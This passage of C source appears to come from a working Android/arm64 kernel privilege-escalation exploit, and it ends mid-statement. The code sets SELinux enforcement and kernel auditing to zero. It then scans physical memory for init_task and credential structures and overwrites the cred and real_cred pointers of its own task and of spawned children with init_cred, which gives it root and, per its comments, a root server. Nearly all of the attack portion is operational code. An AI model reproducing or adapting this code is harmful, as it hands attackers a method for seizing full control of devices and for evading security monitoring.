            /* UMHONLY: root by data alone, with no text patch and no syscall number. Clear
               the SELinux and audit words first, forge the page, wake the chain, and let
               the uid0 helper start the root server while main parks in uaf_pause. A
               failure falls through to the fast path below. */
            if (mode_root && env_on("UMHONLY") && image_pa_found) {
                int umh_rc = -10;
                {   /* SELinux enforcing byte -> 0, at the KNOWN_IMG anchor */
                    uint64_t sel_pa = 0xa0080000ULL + (ST_SELINUX_LINK - ST_TEXT_LINK);
                    if (sel_pa >= LOW_BASE && sel_pa < LOW_BASE + LOW_SIZE &&
                        sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        volatile uint8_t *se =
                            (volatile uint8_t *)(lb + (sel_pa - LOW_BASE) + 1);
                        if (*se == 1) *se = 0;
                        jmp_armed = 0;
                        L("[UMH] SEL enforcing byte->0\n"); log_fsync();
                    } else { jmp_armed = 0; }
                }
                {   /* audit_enabled -> 0 */
                    const uint64_t AUDIT_EN_LINK = 0xffffffc012cec624ULL;
                    uint64_t ae_pa = 0xa0080000ULL +
                        (AUDIT_EN_LINK - 0xffffffc010080000ULL);
                    if (sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        *(volatile uint32_t *)(lb + (ae_pa - LOW_BASE)) = 0;
                        jmp_armed = 0;
                        L("[UMH] audit_enabled->0\n"); log_fsync();
                    } else { jmp_armed = 0; }
                }
                uint64_t ts0;
                { struct timespec tz; clock_gettime(CLOCK_REALTIME, &tz);
                  ts0 = (uint64_t)tz.tv_sec ^ ((uint64_t)getpid() << 32)
                        ^ 0xA5A55A5AULL; }
                uint32_t fid = 0;
                uint64_t fpa = forge_page_find(ts0 * 2654435761ULL,
                                                  ts0 ^ 0x5DEECE66DL, &fid);
                if (fpa) {
                    g_forge_id = fid;
                    L("[UMH] forge_pa=%llx id=%u\n",
                      (unsigned long long)fpa, fid); log_fsync();
                    umh_rc = forge_sub_info_and_run(fpa);
                }
                if (umh_rc == 0) {
                    static const char UGO[] =
                        "[UMH-GO] helper exec'd; root server = umh_root\n";
                    syscall(SYS_write, 1, UGO, sizeof(UGO) - 1);
                    log_fsync(); safe_sync();
                    uaf_pause();   /* main parks for good; the helper carries the server */
                } else {
                    L("[UMH] rc=%d; falling through to the preferred path\n", umh_rc);
                    log_fsync();
                }
            }
            {
                const uint32_t IMG_MAGIC = 0x644D5241u;
                #define MAX_CRED   256
                #define MAX_IMG    64
                static uint64_t cred_hits[MAX_CRED];
                static uint64_t img_hits[MAX_IMG];
                int found_pt = 0;
                /* Dead-zone map: one bit per 2 MB, 1536 bits covering 3 GB. It survives
                   reboots, so a block known to fault is skipped without ever touching it. */
                static uint8_t dmap[1536];
                {
                    int dfd = (int)rsys(SYS_openat, -100,
                        (long)"/data/local/tmp/deadmap.bin", 00, 0, 0, 0);
                    if (dfd >= 0) {
                        long rd_ = rsys(RSC_pread64, (long)dfd,
                            (long)dmap, (long)sizeof(dmap), 0, 0, 0);
                        rs1(SYS_close, dfd);
                        /* a short read would load half a map: discard it */
                        if (rd_ != (long)sizeof(dmap))
                            memset(dmap, 0, sizeof(dmap));
                    }
                }
                int dmap_dirty = 0;
#define DMAP_IDX(p)   (((uint64_t)(p)) >> 21)
#define DMAP_SET(off) do { \
    uint64_t __b = DMAP_IDX(off); \
    if (__b < sizeof(dmap) * 8 && !(dmap[__b >> 3] & (1u << (__b & 7)))) { \
        dmap[__b >> 3] |= (uint8_t)(1u << (__b & 7)); dmap_dirty = 1; \
    } } while (0)
#define DMAP_TST(off) (DMAP_IDX(off) < sizeof(dmap) * 8 ? \
    (int)((dmap[DMAP_IDX(off) >> 3] >> (DMAP_IDX(off) & 7)) & 1) : 1)
/* Incremental save: the dirty flag clears only after a full write, so a
   short write is retried. */
#define DMAP_SAVE() do { \
    int wfd_ = (int)rsys(SYS_openat, -100, \
        (long)"/data/local/tmp/deadmap.bin", \
        02 | 0100 | 010000, 0644, 0, 0); \
    if (wfd_ >= 0) { \
        long wr_ = rsys(SYS_write, (long)wfd_, (long)dmap, \
                        (long)sizeof(dmap), 0, 0, 0); \
        rs1(SYS_close, wfd_); \
        if (wr_ == (long)sizeof(dmap)) dmap_dirty = 0; \
    } \
} while (0)
                #define MAX_INIT_TASK   8
                static uint64_t init_task_hits[MAX_INIT_TASK];   int n_init_task  = 0;
                #define MAX_TSKA 96
                static uint64_t tsk_hits[MAX_TSKA]; int n_tsk = 0;
                /* Burned child task pages: comm is at task_base + 2056, so the base is the
                   hit minus 2056. */
#define MAX_BURN_HIT 256
#define BURN_COMM_TAG 0x6E727562u   /* u32 "burn" */
                static uint64_t burn_hit_pa[MAX_BURN_HIT]; static int burn_hit_suffix[MAX_BURN_HIT];
                int n_burn_hit = 0;
                int n_cred = 0, n_img = 0, csea = 0, n_pg2 = 0;
                L("[D] sweep start\n");
                log_fsync();
                /* One full pass with a sigsetjmp per probe: a fault skips only its own 8 bytes
                   instead of abandoning the rest of the page. Image magic and cred signatures
                   are collected in the same pass. */
                sweep_quiet = 1;   /* logging every 8-byte fault floods the log */
                /* Scan downward from the top: a burned child is spawned once the drain
                   releases, so its pages come from the LIFO head -- the last freed, highest
                   chunk. High-first shortens both the dead-zone exposure and the total scan. */
                /* Window ceiling: PAs near 5 GB hit the secure watchdog and reset the
                   device, so they stay out of the scan. The burn allocation may still land at
                   the top of the window, so LOW_SIZE is the ceiling for now. */
                uint64_t SWEEP_HI = LOW_SIZE;
                /* Two segments, low first: 0 to 0.75 GB upward, then 3 GB down to 0.75 GB.
                   Stop once the cluster is behind us: 96 creds have always fitted inside
                   32 MB, so no new cred within 96 MB of the first one means the edge is
                   passed. A decoy round fails fast on that gate; a real cluster round keeps
                   finding creds and is capped by MAX_CRED instead. */
                const uint64_t SEG1_TOP = 0x30000000ULL;   /* 0.75GB */
                int sweep_seg = 1;
                uint64_t first_cred_off = 0;
                /* The 150 s sweep ceiling needs a clock of its own. g_wd_round is the stage
                   watchdog's feed, so feeding it below would feed the ceiling too and the sweep
                   would never end. Two clocks: sweep0 bounds the scan, g_wd_round the watchdog. */
                long long sweep0 = 0;
                { struct timespec sw0; clock_gettime(CLOCK_MONOTONIC, &sw0);
                  sweep0 = (long long)sw0.tv_sec; }
                for (uint64_t off = 4096; n_cred < MAX_CRED &&
                     n_img < MAX_IMG; ) {
                    if (DMAP_TST(off)) {
                        if (sweep_seg == 1) {
                            off += 4096;
                            if (off >= SEG1_TOP) {
                                sweep_seg = 2; off = SWEEP_HI;
                                first_cred_off = 0;
                            }
                        } else {
                            off -= 4096;
                            if (off < SEG1_TOP) break;
                        }
                        continue;   /* known dead block: skip it */
                    }
                    if (image_pa_found && n_cred >= 32 && n_burn_hit >= 1) break;   /* only stop here with a burned child in hand: an early exit never reaches their task pages */
                    /* The feed has to sit here, inside the loop -- once it is missed, every later
                       stage check reads a stale timestamp and parks the chain for good. */
                    { struct timespec swt5;
                      clock_gettime(CLOCK_MONOTONIC, &swt5);
                      if (swt5.tv_sec - sweep0 > 150) {
                          L("[D] sweep 150s limit reached; bailing out (PSWAP reuses the existing collection)\n");
                          log_fsync();
                          break;
                      }
                      g_wd_round = (long long)swt5.tv_sec;   /* feed the stage watchdog */
                    }
                    if (n_cred >= 16 && n_init_task >= 1) break;   /* do not stop before the init anchor is found */
                    if (n_burn_hit >= 4) break;   /* a burned child is proof enough */
                    if (n_cred >= 8 && first_cred_off &&
                        (first_cred_off > off
                             ? first_cred_off - off
                             : off - first_cred_off) > (96ULL << 20)) {
                        L("[D] cluster gate; stopping once %d creds are collected\n", n_cred);
                        log_fsync();
                        break;
                    }
                    uint64_t o = 0;
                    int page_dead = 0;   /* first fault abandons the whole page */
                    volatile uint8_t *pg = lb + off;
                    while (o <= 4096 - 40 && !page_dead) {
                        volatile uint32_t *q =
                            (volatile uint32_t *)(pg + o);
                        uint32_t a = 0, b = 0, c2 = 0, d3 = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            a = q[0]; b = q[1]; c2 = q[2];
                            d3 = q[3];
                            jmp_armed = 0;
                        } else {
                            jmp_armed = 0; csea++;
                            page_dead = 1;
                            DMAP_SET(off);
                            /* Skip whole 2 MB blocks, following the segment direction: seg1 jumps up to
                               the block top, seg2 drops to the block bottom. */
                            if (sweep_seg == 1)
                                off = (off | 0x1FFFFFULL) + 1 - 4096;
                            else
                                off &= ~(uint64_t)0x1FFFFFULL;
                        }
                        /* Page-table fingerprint: an L3 entry is attrs|PFN and the victim's PFNs run
                           consecutively from 0x80000, so matching a 20-bit run makes a false hit
                           vanishingly unlikely. One hit gives PA_pt, and M follows from a single
                           equation. */
                        if (!found_pt && a == 0x00080067u &&
                            c2 == 0x00080068u) {
                            uint64_t pa_pt = LOW_BASE + off + o;
                            M_known = pa_pt + PAGE_OFF - pt_leak;
                            found_pt = 1;
                            L("[M-PAGE-TABLE] PT@PA=%llx -> M=0x%llx\n",
                              (unsigned long long)pa_pt,
                              (unsigned long long)M_known);
                            log_fsync();
                        }
                        if (a == IMG_MAGIC && n_img < MAX_IMG)
                            img_hits[n_img++] = LOW_BASE + off + o;
                        /* "swap" "per/" 0x30 = the real init_task. The third word is 0x00000030; a
                           reading of 0x0000302F counts one more '/' and never matches. */
                        if (a == 0x70617773u && b == 0x2F726570u &&
                            c2 == 0x00000030u) {
                            if (n_init_task < MAX_INIT_TASK)
                                init_task_hits[n_init_task++] = LOW_BASE + off + o;
                        }
                        /* "kgsl" "_233" "73_p" = a task comm candidate */
                        else if (a == 0x6C73676Bu && b == 0x3333325Fu &&
                                 c2 == 0x5F703337u) {
                            if (n_tsk < MAX_TSKA)
                                tsk_hits[n_tsk++] = LOW_BASE + off + o;
                        }
                        /* The comm may start at o+4, where an 8-byte stride would step over it. */
                        if (o + 4 <= 4096 - 40 && !page_dead &&
                            *(volatile uint32_t *)(pg + o + 4) == 0x6C73676Bu &&
                            *(volatile uint32_t *)(pg + o + 8) == 0x3333325Fu &&
                            *(volatile uint32_t *)(pg + o + 12) == 0x5F703337u) {
                            if (n_tsk < MAX_TSKA)
                                tsk_hits[n_tsk++] = LOW_BASE + off + o + 4;
                        }
                        /* "burn" NN NUL = a burned child's comm; q[0] has already been read. */
                        if (a == 0x6E727562u) {
                            const uint8_t *pb = (const uint8_t *)&b;   /* the digits at o+4..o+7 */
                            uint8_t d1 = pb[0], d2 = pb[1];
                            if (d1 >= '0' && d1 <= '9' && d2 >= '0' && d2 <= '9' &&
                                pb[2] == 0 && pb[3] == 0 &&
                                off + o >= (uint64_t)OFF_COMM &&   /* absolute offset, not page-relative */
                                n_burn_hit < MAX_BURN_HIT) {
                                int bi = (d1 - '0') * 10 + (d2 - '0');
                                if (bi < n_burn) {
                                    burn_hit_pa[n_burn_hit] = LOW_BASE + off + o - OFF_COMM;
                                    burn_hit_suffix[n_burn_hit] = bi;
                                    n_burn_hit++;
                                }
                            }
                        }
                        /* comm is not guaranteed to be 8-byte aligned, so a live task's comm can
                           sit at the o+4 phase and be stepped over. Check "burn" there too: it costs
                           no extra page traversal. */
                        if (o + 4 <= 4096 - 40 && !page_dead &&
                            *(volatile uint32_t *)(pg + o + 4) == 0x6E727562u) {
                            uint32_t b2 = *(volatile uint32_t *)(pg + o + 8);
                            const uint8_t *pb = (const uint8_t *)&b2;
                            uint8_t d1 = pb[0], d2 = pb[1];
                            if (d1 >= '0' && d1 <= '9' && d2 >= '0' && d2 <= '9' &&
                                pb[2] == 0 && pb[3] == 0 &&
                                off + o + 4 >= (uint64_t)OFF_COMM &&
                                n_burn_hit < MAX_BURN_HIT) {
                                int bi = (d1 - '0') * 10 + (d2 - '0');
                                if (bi < n_burn) {
                                    burn_hit_pa[n_burn_hit] = LOW_BASE + off + o + 4 - OFF_COMM;
                                    burn_hit_suffix[n_burn_hit] = bi;
                                    n_burn_hit++;
                                }
                            }
                        }
                        if (b == 2000u && c2 == 2000u) {
                            /* slow path: all nine fields, still inside the same guard */
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                if (q[3] == 2000u && q[4] == 2000u &&
                                    q[5] == 2000u && q[6] == 2000u &&
                                    q[7] == 2000u && q[8] == 2000u &&
                                    q[0] >= 1u && q[0] <= 65535u) {
                                /* PAs from 0x120000000 up are the secure watchdog's decoy region and have
                                   produced false cred hits; real ones all sit in the low segment. */
                                if (n_cred < MAX_CRED &&
                                    off < 0xA0000000ULL) {
                                    cred_hits[n_cred++] =
                                        LOW_BASE + off + o;
                                    if (!first_cred_off)
                                        first_cred_off = off;
                                }
                                }   /* end of the nine-field check */
                                jmp_armed = 0;
                            } else { jmp_armed = 0; csea++; }
                        }
                        o += 8;
                    }
                    if (((++n_pg2) & 0xFF) == 0) {
                        /* Feed every 1024 pages: the old 16K interval blew past the 30 s stage
                           threshold the moment the first fault storm hit. */
                        struct timespec rs9;
                        clock_gettime(CLOCK_MONOTONIC, &rs9);
                        g_wd_round = (long long)rs9.tv_sec;
                        if ((n_pg2 & 0x3FFF) == 0) {
                            L("[D] sweep %d/%d pages img=%d cred=%d\n",
                              n_pg2, (int)(LOW_SIZE >> 12), n_img, n_cred);
                            if (dmap_dirty) DMAP_SAVE();
                        }
                    }
                    if (sweep_seg == 1) {
                        off += 4096;
                        if (off >= SEG1_TOP) {
                            sweep_seg = 2;
                            off = SWEEP_HI;
                            first_cred_off = 0;
                            L("[D] seg1 done; switching to seg2 downward from 3GB\n");
                            log_fsync();
                        }
                    } else {
                        if (off < SEG1_TOP + 4096) break;   /* seg2 has reached the bottom: the whole window is covered. */
                        off -= 4096;
                    }
                }
                sweep_quiet = 0;
                L("[SWEEP] done img=%d cred=%d SEA=%d\n",
                  n_img, n_cred, csea);
                log_fsync();
                if (dmap_dirty) {
                    DMAP_SAVE();
                    L("[DMAP] final save\n");
                }
                /* Point a burned child's task->cred straight at init_cred: no M, no image
                   anchor and no page-table anchor are needed, since delta alone gives
                   init_cred VA = _text_link + delta + off. With tasks.next validated as a
                   linear-map pointer and cred 8-byte aligned, waking every child then reports
                   getuid() == 0. Nothing here depends on a cred landing inside the window. */
                if (mode_root && (have_delta || image_pa_found) &&
                    n_burn_hit > 0) {
                    /* Without delta, derive init_cred VA from M directly; the early image
                       probe supplies it on every boot. */
                    uint64_t init_cred_va =
                        have_delta ? ST_TEXT_LINK + delta + D_INIT_CRED
                                   : image_pa_found + D_INIT_CRED + PAGE_OFF -
                                         M_known;   /* M = 0 is legal */
                    L("[BURN-CRED] %d burn task candidates; init_cred_va=0x%llx\n",
                      n_burn_hit, (unsigned long long)init_cred_va);
                    log_fsync();
                    int zr = 0;
                    for (int zi = 0; zi < n_burn_hit && !zr; zi++) {
                        uint64_t tb = burn_hit_pa[zi];
                        volatile uint64_t *pct = (volatile uint64_t *)(lb + (tb - LOW_BASE));
                        volatile uint64_t *pc = pct + (OFF_CRED / 8);
                        volatile uint64_t *pt = pct + (OFF_TASKS / 8);
                        uint64_t cred_va = 0, nx = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            nx = pt[0];
                            if (nx < 0xffffff8000000000ULL || nx >= 0xffffffc000000000ULL ||
                                (nx & 7)) {
                                jmp_armed = 0; continue;
                            }
                            cred_va = *pc;
                            if (cred_va < 0xffffff8000000000ULL ||
                                cred_va >= 0xffffffc000000000ULL || (cred_va & 7)) {
                                jmp_armed = 0; continue;
                            }
                            /* Both real_cred and cred: getuid() reads real_cred. */
                            pc[-1] = init_cred_va;
                            pc[0] = init_cred_va;
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        L("[BURN-CRED] burn%02d task@0x%llx cred %llx->init (trial patch)\n",
                          burn_hit_suffix[zi], (unsigned long long)tb,
                          (unsigned long long)cred_va);
                        log_fsync();
                        /* Broadcast rather than targeted: burn_hit_suffix is idx % 100, so an index past 100
                           would wake the wrong child. Both pointers are restored afterwards. */
                        for (int bi = 0; bi < n_burn; bi++)
                            (void)write(burn_cmdw[bi], "W", 1);
                        {
                            static struct pollfd zrp[BURN_MAX];
                            int nb = 0;
                            for (int bi = 0; bi < n_burn; bi++) {
                                zrp[nb].fd = burn_rspr[bi];
                                zrp[nb].events = POLLIN;
                                zrp[nb].revents = 0;
                                nb++;
                            }
                            if (poll(zrp, nb, 400) > 0) {
                                for (int bi = 0; bi < n_burn && !zr; bi++) {
                                    if (!(zrp[bi].revents & POLLIN))
                                        continue;
                                    char c;
                                    if (read(burn_rspr[bi], &c, 1) == 1 &&
                                        c == 'R')
                                        zr = 1;
                                }
                            }
                        }
                        if (zr) {
                            L("[+] BURN-CRED burn%02d ROOTED (cred <- init_cred)\n",
                              burn_hit_suffix[zi]);
                            log_fsync();
                        } else {
                            /* Miss: the candidate was stale or misidentified. Restore the original
                               value and leave the real one alone. */
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                pc[-1] = cred_va;
                                pc[0] = cred_va;
                                jmp_armed = 0;
                            } else jmp_armed = 0;
                        }
                        { struct timespec rzy; clock_gettime(CLOCK_MONOTONIC, &rzy);
                          g_wd_round = (long long)rzy.tv_sec; }
                    }
                    if (zr) {
                        safe_sync();
                        uaf_pause();   /* the winner carries the server */
                    } else {
                        L("[BURN-CRED] direct-write route missed; falling back to the cred signature patch\n");
                        log_fsync();
                    }
                }

                /* The image anchor is the bootloader's fixed physical load address. A reverse
                   full-window scan times out long before it reaches it, leaving img = 0, so
                   inject it here: the gate loop below vets every field and simply discards a
                   candidate that fails, so a wrong guess costs nothing. */
                if (n_img == 0 && n_img < MAX_IMG) {
                    img_hits[n_img++] = 0xa0080000ULL + 0x38;
                    L("[IMG] fast path: injecting known ImagePA=0xa0080000\n");
                    log_fsync();
                }

                /* Anchor validation: every header field, plus the identity bound to delta. */
                for (int i = 0; i < n_img && !image_pa_found; i++) {
                    uint64_t img = img_hits[i] - 0x38;
                    uint64_t toff = 0, ksz = 0, kvoff = 0, image_M_candidate = 0, pvoff = 0;
                    uint32_t code0 = 0, peoff = 0;
                    if ((int64_t)(img - LOW_BASE) < 0) continue;
                    if (sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        code0 = *(volatile uint32_t *)(lb + (img - LOW_BASE));
                        toff  = *(volatile uint64_t *)(lb + (img - LOW_BASE) + 0x08);
                        ksz   = *(volatile uint64_t *)(lb + (img - LOW_BASE) + 0x10);
                        peoff = *(volatile uint32_t *)(lb + (img - LOW_BASE) + 0x3C);
                        /* The arm64 image header sits inside the _text segment, so the _text PA is
                           the file base itself. Never add TEXT_OFFSET on top: the loader has already
                           applied 0x80000 once. */
                        image_M_candidate = *(volatile uint64_t *)(lb + (img - LOW_BASE)
                                  + D_MEMSTART);
                        kvoff = *(volatile uint64_t *)(lb + (img - LOW_BASE)
                                  + D_KVOFF);
                        pvoff = *(volatile uint64_t *)(lb + (img - LOW_BASE)
                                  + D_PHYSVIRT);
                        jmp_armed = 0;
                    } else { jmp_armed = 0; continue; }
                    int gates = (code0 == 0x91005A4Du) && peoff == 0x40 &&
                                toff == 0x80000ULL &&
                                ksz >= 0x1000000ULL && ksz <= 0x8000000ULL;
                    if (gates && have_delta)
                        gates = (kvoff == ((ST_TEXT_LINK + delta) - img));
                    if (gates && pvoff + PAGE_OFF != image_M_candidate) gates = 0;
                    if (gates && (image_M_candidate & 0x3FFFFFFFULL)) gates = 0;
                    L("[IMG] cand#%d ImagePA=%llx code0=%x toff=%llx "
                      "ksz=%llx peoff=%x M=%llx kvoff=%llx gates=%d\n",
                      i + 1, (unsigned long long)img, code0,
                      (unsigned long long)toff, (unsigned long long)ksz,
                      peoff, (unsigned long long)image_M_candidate,
                      (unsigned long long)kvoff, gates);
                    log_fsync();
                    if (gates) { image_pa_found = img; M_known = image_M_candidate; }
                }
                L("[IMG] anchor=%llx M_known=%llx\n",
                  (unsigned long long)image_pa_found,
                  (unsigned long long)M_known);
                log_fsync();

                /* Algebraic M from the init_task anchor: the head neighbour's tasks pointer is
                   (init_pa + OFF_TASKS) - M + PAGE_OFF, hence
                   M = init_pa + OFF_TASKS + PAGE_OFF - ptr. Majority vote over candidates. */
                uint64_t M_init_vote = 0; int init_vote_best_count = 0; uint64_t init_task_pa_validated = 0;
                {
                    uint64_t init_task_pa_candidates[8]; int n_ipa = 0;
                    for (int i = 0; i < n_init_task && n_ipa < 8; i++) {
                        uint64_t ipa = init_task_hits[i] >= (uint64_t)OFF_COMM
                                     ? init_task_hits[i] - (uint64_t)OFF_COMM : 0;
                        uint64_t rc = 0, cc2 = 0, tn = 0, tp = 0;
                        if (!ipa) continue;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            rc = *(volatile uint64_t *)
                                (lb + (ipa - LOW_BASE) + 2032);
                            cc2 = *(volatile uint64_t *)
                                (lb + (ipa - LOW_BASE) + OFF_CRED);
                            tn = *(volatile uint64_t *)
                                (lb + (ipa - LOW_BASE) + OFF_TASKS);
                            tp = *(volatile uint64_t *)
                                (lb + (ipa - LOW_BASE) + OFF_TASKS + 8);
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        if (rc != cc2 || (rc >> 48) != 0xffffu ||
                            (tn >> 48) != 0xffffu || (tp >> 48) != 0xffffu)
                            continue;
                        init_task_pa_candidates[n_ipa++] = ipa;
                        L("[M-INIT-VOTE] init_task PA=%llx nx=%llx pv=%llx\n",
                          (unsigned long long)ipa,
                          (unsigned long long)tn, (unsigned long long)tp);
                    }
                    log_fsync();
                    if (n_ipa > 0) {
                        uint64_t init_vote_val[32]; int init_vote_cnt[32]; int init_vote_kinds = 0;
                        for (int t = 0; t < n_tsk; t++) {
                            uint64_t tpa = tsk_hits[t] - (uint64_t)OFF_COMM;
                            uint64_t nx = 0, pv2 = 0;
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                nx = *(volatile uint64_t *)
                                    (lb+(tpa-LOW_BASE)+OFF_TASKS);
                                pv2 = *(volatile uint64_t *)
                                    (lb+(tpa-LOW_BASE)+OFF_TASKS+8);
                                jmp_armed = 0;
                            } else { jmp_armed = 0; continue; }
                            const uint64_t pf[2] = { nx, pv2 };
                            for (int s = 0; s < 2; s++) {
                                uint64_t p = pf[s];
                                if ((p >> 48) != 0xffffu || p < PAGE_OFF ||
                                    p >= PAGE_OFF + 0x100000000ULL) continue;
                                for (int j = 0; j < n_ipa; j++) {
                                    uint64_t M_pair_candidate = init_task_pa_candidates[j]
                                        + (uint64_t)OFF_TASKS + PAGE_OFF - p;
                                    if (M_pair_candidate > LOW_BASE) continue;
                                    if (M_pair_candidate & 0x3FFFFFFFULL) continue;
                                    int f2 = 0;
                                    for (int v = 0; v < init_vote_kinds; v++)
                                        if (init_vote_val[v] == M_pair_candidate) {
                                            init_vote_cnt[v]++; f2 = 1; break;
                                        }
                                    if (!f2 && init_vote_kinds < 32) {
                                        init_vote_val[init_vote_kinds] = M_pair_candidate;
                                        init_vote_cnt[init_vote_kinds] = 1; init_vote_kinds++;
                                    }
                                }
                            }
                        }
                        for (int v = 0; v < init_vote_kinds; v++)
                            if (init_vote_cnt[v] > init_vote_best_count) {
                                init_vote_best_count = init_vote_cnt[v]; M_init_vote = init_vote_val[v];
                            }
                        L("[M-INIT-VOTE] winner M=0x%llx votes=%d (%d distinct values)\n",
                          (unsigned long long)M_init_vote, init_vote_best_count, init_vote_kinds);
                        log_fsync();
                    }
                    if (M_init_vote && init_vote_best_count >= 2) {
                        /* Walk back: the first hop of init.tasks.prev must land inside the window
                           and its comm must be printable. */
                        uint64_t tail = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            tail = *(volatile uint64_t *)
                                (lb + (init_task_pa_candidates[0] - LOW_BASE) + OFF_TASKS + 8);
                            jmp_armed = 0;
                        } else { jmp_armed = 0; }
                        int okv = 0;
                        if ((tail >> 48) == 0xffffu) {
                            /* tail is the neighbouring task's tasks member VA; subtract OFF_TASKS to
                               reach that task's base. */
                            uint64_t tpa = tail - (uint64_t)OFF_TASKS -
                                PAGE_OFF + M_init_vote;
                            if (tpa >= LOW_BASE && tpa < LOW_BASE+LOW_SIZE) {
                                volatile uint8_t *nd =
                                    lb + (tpa - LOW_BASE);
                                if (sigsetjmp(jmpbuf, 1) == 0) {
                                    jmp_armed = 1;
                                    uint8_t c0 = nd[OFF_COMM];
                                    okv = (c0 >= 0x20 && c0 < 0x7f);
                                    jmp_armed = 0;
                                } else { jmp_armed = 0; }
                            }
                        }
                        if (okv) {
                            init_task_pa_validated = init_task_pa_candidates[0];
                            M_known = M_init_vote;
                            L("[M-INIT-VOTE] M confirmed=0x%llx\n",
                              (unsigned long long)M_known);
                        } else { M_init_vote = 0; L("[M-INIT-VOTE] reverse-walk validation failed\n"); }
                        log_fsync();
                    }
                }

                /* Pointer swap, while the window is still intact: this has to run before the
                   content patch tears it, after which every candidate reads back as garbage.
                   M must already be solved. Swap task->real_cred/cred in a live comm candidate
                   first, so getuid() in main itself reports 0 and, being a .data object, main's
                   root survives the window being reclaimed; then do the burned children,
                   confirmed by broadcast and restored on a miss. */
                if (image_pa_found &&   /* M_known == 0 is a legal boot layout, so the anchor decides */
                    (n_tsk > 0 || n_burn_hit > 0)) {
                    const uint64_t init_cred_va = image_pa_found + D_INIT_CRED +
                                           PAGE_OFF - M_known;
                    L("[CRED-PTR-SWAP] M=%llx init_cred_va=%llx tsk=%d hits=%d (priority: main over child)\n",
                      (unsigned long long)M_known,
                      (unsigned long long)init_cred_va, n_tsk, n_burn_hit);
                    log_fsync();
                    /* main's own task first: getuid() verifies it and takes it at once */
                    for (int ti = 0; ti < n_tsk && !main_rooted; ti++) {
                        uint64_t tb = tsk_hits[ti] - (uint64_t)OFF_COMM;
                        if (tb < LOW_BASE ||
                            tb >= LOW_BASE + LOW_SIZE) continue;
                        volatile uint64_t *pc =
                            (volatile uint64_t *)(lb + (tb - LOW_BASE) +
                                                  OFF_CRED);
                        uint64_t sv = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            sv = pc[0];
                            if ((sv >> 48) != 0xffffu || (sv & 7)) {
                                jmp_armed = 0;
                                continue;
                            }
                            pc[0] = init_cred_va;
                            pc[-1] = init_cred_va;
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        if (getuid() == 0) {
                            main_rooted = 1; rooted = 1; perm_win = 1;
                            L("[CRED-PTR-SWAP] main task@%llx cred->init_cred = permanent root\n",
                              (unsigned long long)tb);
                            log_fsync();
                        } else {
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                pc[0] = sv;
                                pc[-1] = sv;
                                jmp_armed = 0;
                            } else jmp_armed = 0;
                            L("[CRED-PTR-SWAP] main candidate#%d missed (restored)\n", ti);
                            log_fsync();
                        }
                        { struct timespec ps1;
                          clock_gettime(CLOCK_MONOTONIC, &ps1);
                          g_wd_round = (long long)ps1.tv_sec; }
                    }
                    /* burned children next: confirmed by broadcast ack, eight at most */
                    int pzw = 0;
                    for (int zi = 0; zi < n_burn_hit && zi < 8 && !pzw; zi++) {
                        uint64_t tb = burn_hit_pa[zi];
                        if (tb < LOW_BASE ||
                            tb >= LOW_BASE + LOW_SIZE) continue;
                        volatile uint64_t *pc =
                            (volatile uint64_t *)(lb + (tb - LOW_BASE) +
                                                  OFF_CRED);
                        uint64_t sv = 0;
                        if (sigsetjmp(jmpbuf, 1) == 0) {
                            jmp_armed = 1;
                            sv = pc[0];
                            if ((sv >> 48) != 0xffffu || (sv & 7)) {
                                jmp_armed = 0;
                                continue;
                            }
                            pc[0] = init_cred_va;
                            pc[-1] = init_cred_va;
                            jmp_armed = 0;
                        } else { jmp_armed = 0; continue; }
                        L("[CRED-PTR-SWAP] burn%02d task@%llx cred->init (trial patch)\n",
                          burn_hit_suffix[zi], (unsigned long long)tb);
                        log_fsync();
                        for (int bi = 0; bi < n_burn; bi++)
                            (void)write(burn_cmdw[bi], "W", 1);
                        {
                            static struct pollfd pzb[BURN_MAX];
                            int nb = 0;
                            for (int bi = 0; bi < n_burn; bi++) {
                                pzb[nb].fd = burn_rspr[bi];
                                pzb[nb].events = POLLIN;
                                pzb[nb].revents = 0;
                                nb++;
                            }
                            if (poll(pzb, nb, 400) > 0) {
                                for (int bi = 0; bi < n_burn && !pzw; bi++) {
                                    if (!(pzb[bi].revents & POLLIN))
                                        continue;
                                    char c;
                                    if (read(burn_rspr[bi], &c, 1) == 1 &&
                                        c == 'R') {
                                        pzw = 1; rooted = 1; perm_win = 1;
                                        L("[CRED-PTR-SWAP] child#%d ROOTED (cred <- init_cred)\n",
                                          bi);
                                        log_fsync();
                                    }
                                }
                            }
                        }
                        if (!pzw) {
                            if (sigsetjmp(jmpbuf, 1) == 0) {
                                jmp_armed = 1;
                                pc[0] = sv;
                                pc[-1] = sv;
                                jmp_armed = 0;
                            } else jmp_armed = 0;
                        }
                        { struct timespec ps2;
                          clock_gettime(CLOCK_MONOTONIC, &ps2);
                          g_wd_round = (long long)ps2.tv_sec; }
                    }
                }

                
                /* Fast deterministic path: seconds instead of a full rescan, and it needs M.
                   The first hop of init_task.tasks.prev is the most recently inserted task,
                   since insertion is at the tail -- the last burned child spawned. Walking
                   backwards from there keeps the burst neighbours inside the window. */
                if (image_pa_found && mode_root && n_burn > 0 &&
                    (n_tsk > 0 || n_burn_hit > 0)) {   /* only worth trying once the sweep has collected a candidate */
                    #define MAX_WZ 128
                    static uint64_t wz_pa[MAX_WZ];
                    int n_wz = 0, whops = 0;
                    uint64_t it_pa = init_task_pa_validated
                        ? init_task_pa_validated : (image_pa_found + D_INIT_TASK);
                    uint64_t head_tasks_rt =
